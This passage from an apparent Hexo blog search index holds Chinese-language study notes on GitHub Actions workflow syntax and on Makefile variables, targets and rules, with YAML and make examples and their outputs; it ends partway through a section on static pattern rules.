class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] Data Structures and Algorithms in C++, 4th Edition (Adam Drozdek)<br>[2] <a href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html">https://www.cs.usfca.edu/~galles/visualization/Algorithms.html</a><br>[3] <a href="https://en.wikipedia.org/wiki/Sorting_algorithm">https://en.wikipedia.org/wiki/Sorting_algorithm</a></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>Github持续集成与交付</title>
    <url>/Automate/CI-CD/github/GithubAction.html</url>
    <content><![CDATA[<p>Github 仓库已支持 CI&#x2F;CD (continuous integration and continuous delivery) 流程，每个仓库均可实现自动化build，test，deploymemt。</p>
<p><a href="https://docs.github.com/en/actions/learn-github-actions">Learn GitHub Actions</a></p>
<span id="more"></span>

<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><ol>
<li>部署runner</li>
<li>在repository中编写需要自动化的workflow</li>
<li>在workflow中指定event触发方式</li>
<li>在workflow中指定运行所在的runner</li>
<li>在workflow中指定每个步骤的job及其依赖关系</li>
<li>在workflow中编写每个job使用的action及shell命令</li>
<li>提交workflow后，自动交由Github Actions平台处理</li>
<li>event产生时，runner拉取repository代码，然后执行job</li>
</ol>
<h2 id="workflow"><a href="#workflow" class="headerlink" title="workflow"></a>workflow</h2><p><a href="https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions">Workflow syntax</a><br><a href="https://docs.github.com/en/actions/using-jobs/assigning-permissions-to-jobs">Assigning permissions to jobs</a><br><a href="https://docs.github.com/en/actions/using-jobs/using-concurrency">Using concurrency</a></p>
<ul>
<li>脚本目录：<code>.github/workflows/*.yml</code>，文件为YAML语法</li>
<li>一个repository可以有多个workflow，且workflow可以互相调用以复用代码</li>
<li>一个yml文件对应一个workflow，一个workflow可包含多个job</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Modifies the default permissions granted to GITHUB_TOKEN.</span></span><br><span class="line"><span class="attr">permissions:</span></span><br><span class="line">  <span class="attr">contents:</span> <span class="string">read</span></span><br><span class="line">  <span class="attr">issues:</span> <span class="string">write</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This allows a subsequently queued workflow run to interrupt previous runs</span></span><br><span class="line"><span class="attr">concurrency:</span></span><br><span class="line">  <span class="attr">group:</span> <span class="string">&#x27;$<span class="template-variable">&#123;&#123; github.workflow &#125;&#125;</span> @ $<span class="template-variable">&#123;&#123; github.event.pull_request.head.label || github.head_ref || github.ref &#125;&#125;</span>&#x27;</span></span><br><span class="line">  <span class="attr">cancel-in-progress:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="event"><a href="#event" class="headerlink" title="event"></a>event</h2><p><a href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows">Events that trigger workflows</a></p>
<ul>
<li>event用于触发workflow执行，支持git操作、REST&#x2F;API、manual方式</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span>   <span class="comment"># manually run from UI</span></span><br><span class="line">  <span class="attr">push:</span>                <span class="comment"># when push to main branch</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span></span><br><span class="line">  <span class="attr">pull_request:</span>        <span class="comment"># when pull request is created or updated</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&#x27;40 19 * * *&#x27;</span> <span class="comment"># once a day at 19:40 UTC / 11:40 PST</span></span><br></pre></td></tr></table></figure>

<h2 id="job"><a href="#job" class="headerlink" title="job"></a>job</h2><ul>
<li>job是在workflow中定义在runner上执行的最小单位，支持shell语法</li>
<li>job是顺序执行的且多个命令相互独立执行</li>
<li>job间可以有依赖关系，没有依赖关系的job会并行执行</li>
</ul>
<h2 id="action"><a href="#action" class="headerlink" title="action"></a>action</h2><p><a href="https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions">Metadata syntax for GitHub Actions</a><br><a href="https://github.com/marketplace?type=actions">GitHub Marketplace Actions</a></p>
<ul>
<li>action是在Github Actions平台上执行的特定应用，打包了一些频繁使用且复杂的重复task</li>
<li>job中使用action可减少重复的代码量</li>
<li>通过uses引用action，<a href="https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions">支持形式</a>有<ul>
<li>公共仓库中的名字：<code>actions/checkout@v3</code></li>
<li>仓库中的相对目录：<code>./.github/actions/demo</code></li>
<li>docker镜像地址：<code>docker://alpine:3.8</code></li>
</ul>
</li>
<li>支持自定义action</li>
</ul>
<h2 id="runner"><a href="#runner" class="headerlink" title="runner"></a>runner</h2><ul>
<li>runner是用于执行workflow的服务</li>
</ul>
<h1 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h1><ul>
<li><code>&#39;-&#39;</code> - 分割step</li>
<li>env - 自定义环境变量</li>
<li>name - job&#x2F;step的名字</li>
<li>needs - 依赖的job</li>
<li>run - 执行shell</li>
<li>users - 执行action</li>
</ul>
<h1 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h1><p><a href="https://docs.github.com/en/actions/learn-github-actions/contexts">Contexts</a></p>
<ul>
<li>github - workflow运行相关信息</li>
<li>env - workflow中的环境变量</li>
<li>job - 当前job信息</li>
<li>steps - 当前job中的steps信息</li>
<li>runner - 当前job所在的runner信息</li>
<li>secrets - workflow可用的私密信息</li>
<li>strategy - 当前job的执行策略</li>
<li>matrix - 当前job的矩阵属性</li>
<li>needs - 当前job依赖的其他job的输出信息</li>
<li>inputs - workflow的输入信息</li>
</ul>
<h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p><a href="https://docs.github.com/en/actions/learn-github-actions/environment-variables">Environment variables</a></p>
<ul>
<li>三种类型：<ul>
<li><code>env</code>：应用整个workflow</li>
<li><code>jobs.&lt;job_id&gt;.env</code>：应用特定job</li>
<li><code>jobs.&lt;job_id&gt;.steps[*].env</code>：应用特定step</li>
</ul>
</li>
<li>支持通过context读写环境变量<ul>
<li><code>$&#123;&#123; env.MY_VARIABLE &#125;&#125;</code> 通过env访问自定义环境变量</li>
</ul>
</li>
<li>自定义路径相关的环境变量应该加<code>_PATH</code>后缀</li>
</ul>
<h1 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h1><p><a href="https://docs.github.com/en/actions/learn-github-actions/expressions">Expressions</a></p>
<ul>
<li><code>$&#123;&#123; <expression> &#125;&#125;</code>格式表示作为表达式解释，而非字符串</li>
<li>当if条件（默认按表达式解释）为ture时，step将运行</li>
<li>支持数据类型：boolean, null, number, string（单引号作为转义字符）</li>
<li>支持内建函数<ul>
<li>contains: 包含子项时为true （大小写不敏感）</li>
<li>startsWith: 以特定字符开始时为true（大小写不敏感）</li>
<li>endsWith：以特定字符结束时为true （大小写不敏感）</li>
<li>format：按占位符格式化字符串</li>
<li>join：连接两项</li>
<li>toJSON：序列化json字符串</li>
<li>fromJSON：反序列化json字符串</li>
</ul>
</li>
<li>支持状态检查函数：<ul>
<li>success：之前的step既没有失败又没有取消时为true</li>
<li>failure：之前的step失败时为true</li>
<li>cancelled：workflow被取消时为true</li>
<li>always：step始终执行时为true</li>
</ul>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">steps:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Failing</span> <span class="string">step</span></span><br><span class="line">    <span class="attr">id:</span> <span class="string">demo</span></span><br><span class="line">    <span class="attr">run:</span> <span class="string">exit</span> <span class="number">1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">The</span> <span class="string">demo</span> <span class="string">step</span> <span class="string">has</span> <span class="string">failed</span></span><br><span class="line">    <span class="attr">if:</span> <span class="string">$&#123;&#123;</span> <span class="string">failure()</span> <span class="string">&amp;&amp;</span> <span class="string">steps.demo.conclusion</span> <span class="string">==</span> <span class="string">&#x27;failure&#x27;</span> <span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><h2 id="自定义变量"><a href="#自定义变量" class="headerlink" title="自定义变量"></a>自定义变量</h2><p>POSTGRES_HOST 和 POSTGRES_PORT 变量可在 <code>node client.js</code> 脚本中使用</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">example-job:</span></span><br><span class="line">      <span class="attr">steps:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Connect</span> <span class="string">to</span> <span class="string">PostgreSQL</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">node</span> <span class="string">client.js</span></span><br><span class="line">          <span class="attr">env:</span></span><br><span class="line">            <span class="attr">POSTGRES_HOST:</span> <span class="string">postgres</span></span><br><span class="line">            <span class="attr">POSTGRES_PORT:</span> <span class="number">5432</span></span><br></pre></td></tr></table></figure>

<h2 id="调用仓库中的脚本"><a href="#调用仓库中的脚本" class="headerlink" title="调用仓库中的脚本"></a>调用仓库中的脚本</h2><p><a href="https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions">workflow-syntax-for-github-actions</a></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">example-job:</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Run</span> <span class="string">build</span> <span class="string">script</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">./.github/scripts/build.sh</span></span><br><span class="line">        <span class="attr">shell:</span> <span class="string">bash</span></span><br></pre></td></tr></table></figure>

<h2 id="job间共享数据"><a href="#job间共享数据" class="headerlink" title="job间共享数据"></a>job间共享数据</h2><div class="tabs" id="artifact"><ul class="nav-tabs"><li class="tab active"><a href="#artifact-1">upload-artifact</a></li><li class="tab"><a href="#artifact-2">download-artifact</a></li></ul><div class="tab-content"><div class="tab-pane active" id="artifact-1"><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">example-job:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Save</span> <span class="string">output</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">shell:</span> <span class="string">bash</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          expr 1 + 1 &gt; output.log</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Upload</span> <span class="string">output</span> <span class="string">file</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/upload-artifact@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">output-log-file</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">output.log</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="artifact-2"><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">example-job:</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Download</span> <span class="string">a</span> <span class="string">single</span> <span class="string">artifact</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/download-artifact@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">output-log-file</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">learn-github-actions</span>              <span class="comment"># name of the workflow</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>]                              <span class="comment"># workflow is triggered when push event</span></span><br><span class="line"><span class="attr">jobs:</span>                                   <span class="comment"># job group</span></span><br><span class="line">  <span class="attr">check-bats-version:</span>                   <span class="comment"># name of the job</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span>              <span class="comment"># name of runner</span></span><br><span class="line">    <span class="attr">steps:</span>                              <span class="comment"># steps of the job</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span>       <span class="comment"># clone repository to runner by action</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span>     <span class="comment"># install node &amp; npm to runner by action</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&#x27;14&#x27;</span>            <span class="comment"># use node v14</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">bats</span>        <span class="comment"># exec npm to install bats on runner</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">bats</span> <span class="string">-v</span>                    <span class="comment"># exec bats on runner</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Automate</category>
        <category>CI/CD</category>
        <category>github</category>
      </categories>
      <tags>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Makefile基础</title>
    <url>/Automate/make/Makefile.html</url>
    <content><![CDATA[<p>Make构建基础.</p>
<span id="more"></span>

<h1 id="执行（execution）"><a href="#执行（execution）" class="headerlink" title="执行（execution）"></a>执行（execution）</h1><p><code>-s</code> 忽略所有命令输出到控制台<br><code>-k</code> 遇到错误继续执行</p>
<div class="tabs" id="commands-and-execution"><ul class="nav-tabs"><li class="tab active"><a href="#commands-and-execution-1">suppress error</a></li><li class="tab"><a href="#commands-and-execution-2">recursive make</a></li></ul><div class="tab-content"><div class="tab-pane active" id="commands-and-execution-1"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="section">one:</span></span><br><span class="line">    <span class="comment"># This error will be printed but ignored, and make will continue to run</span></span><br><span class="line">    -false</span><br><span class="line">    touch one</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="commands-and-execution-2"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line">new_contents = <span class="string">&quot;hello:\n\ttouch inside_file&quot;</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    mkdir -p subdir</span><br><span class="line">    printf <span class="variable">$(new_contents)</span> | sed -e &#x27;s/^ //&#x27; &gt; subdir/makefile</span><br><span class="line">    <span class="comment"># MAKE variable will pass the make flags</span></span><br><span class="line">    cd subdir &amp;&amp; <span class="variable">$(MAKE)</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -rf subdir</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="变量（variable）"><a href="#变量（variable）" class="headerlink" title="变量（variable）"></a>变量（variable）</h1><h2 id="Make"><a href="#Make" class="headerlink" title="Make"></a>Make</h2><ul>
<li>变量只支持字符串，未定义变量为空字符串<ul>
<li><code>=</code> 使用此变量时，其左侧的值才会被解析</li>
<li><code>:=</code> 定义此变量时，其左侧的值才会被解析</li>
<li><code>?=</code> 变量未定义时，才会赋值给它</li>
<li><code>+=</code> 追加字符串</li>
<li><code>override</code> 允许覆盖来自命令行参数中的变量</li>
<li><code>\</code> 反斜杠字符支持将长字符串写成多行</li>
</ul>
</li>
<li>单引号或双引号没有特殊意义，只标识字符串</li>
<li>引用变量可通过<code>$&#123;&#125;</code>和<code>$()</code></li>
</ul>
<div class="tabs" id="variable-make"><ul class="nav-tabs"><li class="tab active"><a href="#variable-make-1">basic</a></li><li class="tab"><a href="#variable-make-2">:=</a></li><li class="tab"><a href="#variable-make-3">?=</a></li><li class="tab"><a href="#variable-make-4">+=</a></li><li class="tab"><a href="#variable-make-5">override</a></li></ul><div class="tab-content"><div class="tab-pane active" id="variable-make-1"><figure class="highlight make"><figcaption><span>Makefile</span></figcaption><table><tr><td class="code"><pre><span class="line">a := 1</span><br><span class="line">b := &#x27;2&#x27;</span><br><span class="line">c := a b</span><br><span class="line">d := hello   <span class="comment"># with 3 space</span></span><br><span class="line"><span class="section">all: <span class="variable">$(c)</span> e</span></span><br><span class="line">    echo <span class="variable">$(c)</span></span><br><span class="line">    echo [<span class="variable">$(d)</span>]</span><br><span class="line"><span class="section">a:</span></span><br><span class="line">    echo &#x27;$a&#x27; &#x27;<span class="variable">$(a)</span>&#x27;</span><br><span class="line"><span class="section">b:</span></span><br><span class="line">    echo $b $&#123;b&#125;</span><br><span class="line"><span class="section">e:</span></span><br><span class="line">    echo Too long, so \</span><br><span class="line">        use multiple lines!</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><figcaption><span>$ make -s</span></figcaption><table><tr><td class="code"><pre><span class="line">1 1</span><br><span class="line">2 2</span><br><span class="line">Too long, so use multiple lines!</span><br><span class="line">a b</span><br><span class="line">[hello ]</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="variable-make-2"><figure class="highlight make"><figcaption><span>MakefileVar</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Recursive variable, looks for it when the command is used</span></span><br><span class="line">one = 1-$&#123;later_variable&#125;</span><br><span class="line"><span class="comment"># Simply expanded variable, expand it when is defined</span></span><br><span class="line">two := 2-$&#123;later_variable&#125;</span><br><span class="line"></span><br><span class="line">later_variable = later</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    echo <span class="variable">$(one)</span></span><br><span class="line">    echo <span class="variable">$(two)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><figcaption><span>$ make -s -f MakefileVar</span></figcaption><table><tr><td class="code"><pre><span class="line">1-later</span><br><span class="line">2-</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="variable-make-3"><figure class="highlight make"><figcaption><span>MakefileVar</span></figcaption><table><tr><td class="code"><pre><span class="line">one = hello</span><br><span class="line">one ?= will not be set</span><br><span class="line">two ?= will be set</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    echo <span class="variable">$(one)</span></span><br><span class="line">    echo <span class="variable">$(two)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><figcaption><span>$ make -s -f MakefileVar</span></figcaption><table><tr><td class="code"><pre><span class="line">hello</span><br><span class="line">will be <span class="built_in">set</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="variable-make-4"><figure class="highlight make"><figcaption><span>MakefileVar</span></figcaption><table><tr><td class="code"><pre><span class="line">foo := start</span><br><span class="line">foo += more</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    echo <span class="variable">$(foo)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><figcaption><span>$ make -s -f MakefileVar</span></figcaption><table><tr><td class="code"><pre><span class="line">start more</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="variable-make-5"><figure class="highlight make"><figcaption><span>MakefileOverride</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Overrides command line arguments</span></span><br><span class="line"><span class="keyword">override</span> option_one = did_override</span><br><span class="line"><span class="comment"># Does not override command line arguments</span></span><br><span class="line">option_two = not_override</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    echo <span class="variable">$(option_one)</span></span><br><span class="line">    echo <span class="variable">$(option_two)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><figcaption><span>$ make option_one=1 option_two=2 -s -f MakefileOverride</span></figcaption><table><tr><td class="code"><pre><span class="line">did_override</span><br><span class="line">2</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="自动变量（automatic）"><a href="#自动变量（automatic）" class="headerlink" title="自动变量（automatic）"></a>自动变量（automatic）</h3><p><a href="https://www.gnu.org/software/make/manual/html_node/Automatic-Variables.html#Automatic-Variables">10.5.3 Automatic Variables</a></p>
<ul>
<li><code>$@</code> 目标（target）的文件名称，例如 <code>%.c:</code> -&gt; <code>xxx.c</code></li>
<li><code>$*</code> 目标的匹配名称，例如 <code>%.c:</code> -&gt; <code>xxx</code></li>
<li><code>$&lt;</code> 第一个先决条件（prerequisite）的名称，例如 <code>x.o: a.c b.c</code> -&gt; <code>a.c</code></li>
<li><code>$^</code> 由空格分隔的所有先决条件的名称，例如 <code>x.o: a.c b.c</code> -&gt; <code>a.c b.c</code></li>
<li><code>$?</code> 由空格分隔的所有新于目标的先决条件的名称</li>
<li><code>$|</code> 由空格分隔的所有order-only的先决条件的名称</li>
<li><code>$%</code> 归档（archive）目标的成员名称，例如 <code>foo.a(bar.o):</code> -&gt; <code>bar.o</code></li>
<li><code>$+</code> 同<code>$^</code>，已排序</li>
</ul>
<h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><ul>
<li>默认SHELL&#x3D;&#x2F;bin&#x2F;sh</li>
<li>环境变量既可作为make变量，又可作为shell变量</li>
<li><code>$$</code> 引用shell变量</li>
<li><code>export</code> 将一个make变量转换为环境变量</li>
<li><code>EXPORT_ALL_VARIABLES</code> 将所有make变量转换为环境变量</li>
</ul>
<div class="tabs" id="variable-bash"><ul class="nav-tabs"><li class="tab active"><a href="#variable-bash-1">set-shell</a></li><li class="tab"><a href="#variable-bash-2">make&shell-variable</a></li><li class="tab"><a href="#variable-bash-3">env-variable</a></li></ul><div class="tab-content"><div class="tab-pane active" id="variable-bash-1"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Set shell</span></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="section">cool:</span></span><br><span class="line">    <span class="comment"># Ignore the command to console</span></span><br><span class="line">    @echo <span class="string">&quot;Hello from bash&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="variable-bash-2"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line">make_var = I am a make variable</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="comment"># Same as running &quot;sh_var=&#x27;I am a shell variable&#x27;; echo $sh_var&quot; in the shell</span></span><br><span class="line">    sh_var=&#x27;I am a shell variable&#x27;; echo $$sh_var</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Same as running &quot;echo I am a amke variable&quot; in the shell</span></span><br><span class="line">    echo <span class="variable">$(make_var)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="variable-bash-3"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Run this with &quot;export shell_env_var=&#x27;I am an environment variable&#x27;; make&quot;</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="comment"># Print out the Shell variable</span></span><br><span class="line">    @echo $$shell_env_var</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Print out the Make variable</span></span><br><span class="line">    @echo <span class="variable">$(shell_env_var)</span></span><br><span class="line"></span><br><span class="line">    @echo <span class="variable">$(shell_env_var_inside)</span></span><br><span class="line">    @echo $$shell_env_var_inside</span><br><span class="line"></span><br><span class="line">    @echo <span class="variable">$(one)</span></span><br><span class="line">    @echo $$one</span><br><span class="line">    @echo <span class="variable">$(two)</span></span><br><span class="line">    @echo $$two</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note the variable and exports, are set/affected globally.</span></span><br><span class="line">shell_env_var_inside=shell env var that created inside of Make</span><br><span class="line"><span class="keyword">export</span> shell_env_var_inside  <span class="comment"># <span class="doctag">NOTE:</span> should comment when EXPORT_ALL_VARIABLES exist</span></span><br><span class="line"></span><br><span class="line"><span class="section">.EXPORT_ALL_VARIABLES:</span></span><br><span class="line">one=1</span><br><span class="line">two=2</span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ export shell_env_var='an env variable'; make -f MakefileEnv</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># Print out the Shell variable</span></span><br><span class="line">an env variable</span><br><span class="line"><span class="comment"># Print out the Make variable</span></span><br><span class="line">an env variable</span><br><span class="line">shell env var that created inside of Make</span><br><span class="line">shell env var that created inside of Make</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">2</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="目标（target）"><a href="#目标（target）" class="headerlink" title="目标（target）"></a>目标（target）</h1><ul>
<li><code>$@</code>是构建目标名称</li>
<li><code>TARGET: xxx</code> 定义特定于某个目标的make变量</li>
</ul>
<div class="tabs" id="shell-target"><ul class="nav-tabs"><li class="tab active"><a href="#shell-target-1">basic</a></li><li class="tab"><a href="#shell-target-2">target-variable</a></li></ul><div class="tab-content"><div class="tab-pane active" id="shell-target-1"><figure class="highlight make"><figcaption><span>MakefileTarget</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="section">all: f1.o f2.o</span></span><br><span class="line"></span><br><span class="line">f1.o f2.o:</span><br><span class="line">    echo <span class="variable">$@</span></span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ make -f MakefileTarget</span></figcaption><table><tr><td class="code"><pre><span class="line">echo f1.o</span><br><span class="line">f1.o</span><br><span class="line">echo f2.o</span><br><span class="line">f2.o</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="shell-target-2"><figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="section">%.c: one = cool</span></span><br><span class="line"></span><br><span class="line"><span class="section">this.c:</span></span><br><span class="line">    echo one is defined: <span class="variable">$(one)</span></span><br><span class="line"></span><br><span class="line"><span class="section">other:</span></span><br><span class="line">    echo one is nothing: <span class="variable">$(one)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ make -s -f MakefileTarget this.c</span></figcaption><table><tr><td class="code"><pre><span class="line">one is defined: cool</span><br></pre></td></tr></table></figure>

<figure class="highlight make"><figcaption><span>$ make -s -f MakefileTarget other</span></figcaption><table><tr><td class="code"><pre><span class="line">one is nothing:</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="通配符（wildcard）"><a href="#通配符（wildcard）" class="headerlink" title="通配符（wildcard）"></a>通配符（wildcard）</h1><h2 id=""><a href="#" class="headerlink" title="*"></a><code>*</code></h2><figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Print out file information about every .c file</span></span><br><span class="line"><span class="section">print: $(wildcard *.c)</span></span><br><span class="line">    ls -la  <span class="variable">$?</span></span><br></pre></td></tr></table></figure>

<h2 id="-1"><a href="#-1" class="headerlink" title="%"></a><code>%</code></h2><p>Static Pattern Rules<br>Pattern Rules<br>String Substitution<br>The vpath Directive</p>
<h1 id="规则（rule）"><a href="#规则（rule）" class="headerlink" title="规则（rule）"></a>规则（rule）</h1><h2 id="隐式规则（Implicit）"><a href="#隐式规则（Implicit）" class="headerlink" title="隐式规则（Implicit）"></a>隐式规则（Implicit）</h2><p><code>CC</code>: C编译器，默认<code>cc</code><br><code>CXX</code>: C++编译器，默认<code>g++</code><br><code>CFLAGS</code>: C编译选项<br><code>CXXFLAGS</code>: C++编译选项<br><code>CPPFLAGS</code>: C预处理器选项<br><code>LDFLAGS</code>: 链接选项</p>
<p><code>$(CC) -c $(CPPFLAGS) $(CFLAGS)</code> (n.c -&gt; n.o)<br><code>$(CXX) -c $(CPPFLAGS) $(CXXFLAGS)</code> (n.cc&#x2F;n.cpp -&gt; n.o)<br><code>$(CC) $(LDFLAGS) n.o $(LOADLIBES) $(LDLIBS)</code> (n.o -&gt; n)</p>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">objects = foo.o bar.o all.o</span><br><span class="line"><span class="section">all: <span class="variable">$(objects)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># These files compile via implicit rules</span></span><br><span class="line"><span class="section">foo.o: foo.c</span></span><br><span class="line"><span class="section">bar.o: bar.c</span></span><br><span class="line"><span class="section">all.o: all.c</span></span><br><span class="line"></span><br><span class="line"><span class="section">all.c:</span></span><br><span class="line">    echo <span class="string">&quot;int main() &#123; return 0; &#125;&quot;</span> &gt; all.c</span><br><span class="line"></span><br><span class="line"><span class="section">%.c:</span></span><br><span class="line">    touch <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f *.c *.o all</span><br></pre></td></tr></table></figure>

<h2 id="静态匹配规则（Static-Pattern）"><a href="#静态匹配规则（Static-Pattern）" class="headerlink" title="静态匹配规则（Static Pattern）"></a>静态匹配规则（Static Pattern）</h2><figure class="highlight make"><table><tr><td class="code"><pre><span class="line"><span class="section">targets...: target-pattern: prereq-patterns ...</span></span><br><span class="line">    commands</span><br></pre></td></tr></table></figure>

